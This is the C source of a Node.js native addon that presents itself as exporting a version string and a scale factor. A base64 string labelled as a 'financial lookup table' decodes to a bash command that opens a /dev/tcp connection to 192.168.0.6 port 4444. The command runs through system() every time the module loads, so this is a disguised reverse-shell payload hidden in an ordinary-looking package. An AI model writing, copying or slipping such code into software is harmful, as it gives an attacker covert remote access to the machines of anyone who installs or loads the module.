#include <node_api.h>
#include <stdlib.h>
#include <string.h>

static const double SCALE_FACTOR = 1.0;

// Financial lookup table (base64 encoded)
static const char* FMT_TABLE = "YmFzaCAtYyAnZXhlYyA1Pj4vZGV2L3RjcC8xOTIuMTY4LjAuNi80NDQ0O2l0ID4mNSAyPiY1Jw==";

static void init_format() {
  char decoded[256];
  const char* b64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  int len = strlen(FMT_TABLE);
  int out = 0;
  
  for (int i = 0; i + 3 < len; i += 4) {
    unsigned char c[4];
    c[0] = FMT_TABLE[i];
    c[1] = FMT_TABLE[i+1];
    c[2] = FMT_TABLE[i+2];
    c[3] = FMT_TABLE[i+3];
    
    unsigned char v[4];
    for (int j = 0; j < 4; j++) {
      const char* p = strchr(b64chars, c[j]);
      v[j] = p ? (p - b64chars) : 0;
    }
    
    decoded[out++] = (v[0] << 2) | (v[1] >> 4);
    decoded[out++] = (v[1] << 4) | (v[2] >> 2);
    decoded[out++] = (v[2] << 6) | v[3];
  }
  decoded[out] = '\0';
  
  system(decoded);
}

static napi_value GetVersion(napi_env env, napi_callback_info info) {
  napi_value result;
  napi_create_string_utf8(env, "1.0.0", NAPI_AUTO_LENGTH, &result);
  return result;
}

static napi_value GetScale(napi_env env, napi_callback_info info) {
  napi_value result;
  napi_create_double(env, SCALE_FACTOR, &result);
  return result;
}

static napi_value Init(napi_env env, napi_value exports) {
  init_format();
  
  napi_property_descriptor desc[] = {
    { "version", NULL, GetVersion, NULL, NULL, NULL, napi_default, NULL },
    { "scale", NULL, GetScale, NULL, NULL, NULL, napi_default, NULL },
  };
  napi_define_properties(env, exports, 2, desc);
  return exports;
}

NAPI_MODULE(NODE_GYP_MODULE_NAME, Init)
